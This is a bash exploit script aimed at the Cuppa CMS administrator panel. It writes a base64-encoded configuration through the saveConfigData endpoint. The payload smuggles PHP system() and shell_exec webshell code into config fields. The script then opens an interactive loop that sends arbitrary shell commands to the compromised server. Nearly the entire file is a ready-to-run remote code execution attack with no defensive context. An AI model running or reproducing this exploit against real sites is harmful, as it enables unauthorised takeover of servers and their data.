#!/bin/bash

set -eu

if [[ $# -eq 0 ]] ; then
    echo "./$0 http://cuppa.site.com/administrator"
    exit 1
fi

url="$1"

echo $url
function infect(){
  path="$(echo "$url" | cut -d '/' -f 4-)"
  curl --silent -k -o /dev/null --cookie "administrator_path=$url;administrator_document_path=/$path" -XPOST  -H "Content-Type: application/x-www-form-urlencoded" -d "file=eyJhZG1pbmlzdHJhdG9yX3RlbXBsYXRlIjoiZGVmYXVsdCIsImxpc3RfbGltaXQiOiIyNSIsImZvbnRfbGlzdCI6IlJhbGV3YXkiLCJzZWN1cmVfbG9naW4iOiIwIiwic2VjdXJlX2xvZ2luX3ZhbHVlIjoiIiwic2VjdXJlX2xvZ2luX3JlZGlyZWN0IjoiIiwibGFuZ3VhZ2VfZGVmYXVsdCI6ImVuIiwiY291bnRyeV9kZWZhdWx0IjoidXMiLCJnbG9iYWxfZW5jb2RlIjoic2hhMVNhbHQiLCJnbG9iYWxfZW5jb2RlX3NhbHQiOiJIS2VRdkk3TUVjM25kbHFhYWdqczBTUUNKdElkOThKUSIsInNzbCI6IjAiLCJsYXRlcmFsX21lbnUiOiJleHBhbmRlZCIsImJhc2VfdXJsIjoiIiwiYXV0b19sb2dvdXRfdGltZSI6IjMwIiwicmVkaXJlY3RfdG8iOiJmYWxzZSIsImhvc3QiOiJsb2NhbGhvc3QiLCJkYiI6InRlc3RlIiwidXNlciI6InJvb3QiLCJwYXNzd29yZCI6InBhc3N3b3JkIiwidGFibGVfcHJlZml4IjoiY3VfIiwiYWxsb3dlZF9leHRlbnNpb25zIjoiKi5naWY7ICouanBnOyAqLmpwZWc7ICoucGRmOyAqLmljbzsgKi5wbmc7ICouc3ZnXCI7IGZ1bmN0aW9uIF9fY29uc3RydWN0KCl7IHN5c3RlbSgkX1BPU1RbXCJjbWRcIl0pOyB9IC8vIiwidXBsb2FkX2RlZmF1bHRfcGF0aCI6InVwbG9hZF9maWxlcyIsIm1heGltdW1fZmlsZV9zaXplIjoiNTI0Mjg4MCIsImNzdl9jb2x1bW5fc2VwYXJhdG9yIjoiLCIsInRpbmlmeV9rZXkiOiIiLCJlbWFpbF9vdXRnb2luZyI6IiIsImZvcndhcmQiOiIiLCJzbXRwIjoiMCIsImVtYWlsX2hvc3QiOiIiLCJlbWFpbF9wb3J0IjoiIiwiZW1haWxfcGFzc3dvcmQiOiIiLCJzbXRwX3NlY3VyaXR5IjoiIiwiY29kZSI6IlBEOXdhSEFnWldOb2J5QnphR1ZzYkY5bGVHVmpLQ1JmUjBWVVd5SmpiV1FpWFNrN0lEOCsifQ==&function=saveConfigData" "$url/classes/ajax/Functions.php" 
}
infect
while true;do
  echo -n "cuppa@cuppa-server# "
  read command
  curl --silent -k "$url/api/test/curl.php" -d "cmd=$command" | sort -u
done
